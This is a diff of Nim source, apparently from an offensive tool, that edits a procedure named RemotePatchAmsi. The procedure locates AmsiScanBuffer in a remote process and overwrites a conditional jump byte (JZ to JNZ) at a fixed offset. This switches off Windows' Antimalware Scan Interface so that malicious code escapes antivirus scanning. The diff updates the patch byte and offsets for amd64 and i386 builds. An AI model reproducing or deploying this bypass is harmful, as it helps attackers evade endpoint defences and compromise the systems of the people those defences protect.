@@ -223,9 +223,9 @@ let RemotePatchAMSIStub* = """
 proc RemotePatchAmsi(hProcss :HANDLE): bool =
 
     when defined amd64:
-        let patch: array[1, byte] = [byte 0x74] # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
+        let patch: array[1, byte] = [byte 0x75] # Patch JZ to JNZ
     elif defined i386:
-        let patch: array[1, byte] = [byte 0x74] # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
+        let patch: array[1, byte] = [byte 0x75] 
 
 
     var disabled: bool = false
@@ -242,9 +242,9 @@ proc RemotePatchAmsi(hProcss :HANDLE): bool =
             echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
         return disabled
     when defined amd64:
-        RemoteProc = RemoteProc + 0x83 # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
+        RemoteProc = RemoteProc + 0x6D
     else:
-        RemoteProc = RemoteProc + 0x75
+        RemoteProc = RemoteProc + 0x47
     var oldProtection: DWORD = 0
     var success: BOOL
     var protectAddress = RemoteProc
